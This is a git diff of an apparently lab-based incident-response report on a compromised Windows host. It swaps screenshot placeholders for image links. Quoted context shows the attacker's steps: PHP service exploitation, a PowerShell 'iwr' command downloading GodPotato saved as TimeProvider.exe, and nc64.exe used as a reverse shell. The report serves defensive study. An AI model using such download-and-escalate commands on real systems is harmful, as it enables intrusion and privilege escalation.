@@ -56,7 +56,7 @@ Findings:
 * First responding port: **22**
 
 Evidence:
-(Insert Screenshot 1 — port scan)
+<img width="1908" height="967" alt="Screenshot 2026-02-18 053416" src="https://github.com/user-attachments/assets/871a55d6-6255-4982-a4f6-c4aa8e32d1c9" />
 
 ---
 
@@ -78,7 +78,7 @@ MITRE Technique:
 **T1190 — Exploit Public-Facing Application**
 
 Evidence:
-(Insert Screenshot 2 — HTTP exploit request)
+<img width="1912" height="975" alt="Screenshot 2026-02-18 053533" src="https://github.com/user-attachments/assets/be661218-77db-4f4c-b74f-a59f8258918b" />
 
 ---
 
@@ -93,7 +93,8 @@ Victim account identified:
 **cristo**
 
 Evidence:
-(Insert Screenshot 3 — command execution)
+
+<img width="631" height="112" alt="Screenshot 2026-02-18 053612" src="https://github.com/user-attachments/assets/5c06cb19-dc58-46dc-86e3-f6b81e76c601" />
 
 ---
 
@@ -114,7 +115,7 @@ iwr https://github.com/.../GodPotato-NET4.exe -Outfile TimeProvider.exe
 ```
 
 Evidence:
-(Insert Screenshot 4 — payload download)
+<img width="1371" height="1087" alt="Screenshot 2026-02-18 053605" src="https://github.com/user-attachments/assets/410d17f7-ec1e-4de1-8c0e-4b71866bc8d8" />
 
 ---
 
@@ -133,7 +134,7 @@ Goal:
 Escalate privileges to SYSTEM.
 
 Evidence:
-(Insert Screenshot 5 — privilege escalation command)
+<img width="1371" height="1087" alt="Screenshot 2026-02-18 053605" src="https://github.com/user-attachments/assets/1c2afad4-34a8-40af-914b-ae7ba6af2815" />
 
 ---
 
@@ -146,7 +147,7 @@ Cannot create process Win32Error:2
 ```
 
 Evidence:
-(Insert Screenshot 6 — error output)
+<img width="1368" height="771" alt="Screenshot 2026-02-18 053612" src="https://github.com/user-attachments/assets/59ed0c6c-90e1-4122-b96d-e40386eea94c" />
 
 ---
 
@@ -208,3 +209,4 @@ Reverse shell: nc64.exe
 ## 🧾 Conclusion
 
 The attacker exploited a vulnerable PHP service to gain remote code execution, downloaded tools for persistence and privilege escalation, and attempted to elevate privileges using GodPotato. Although the escalation failed, the host was fully compromised and required containment and remediation.
+
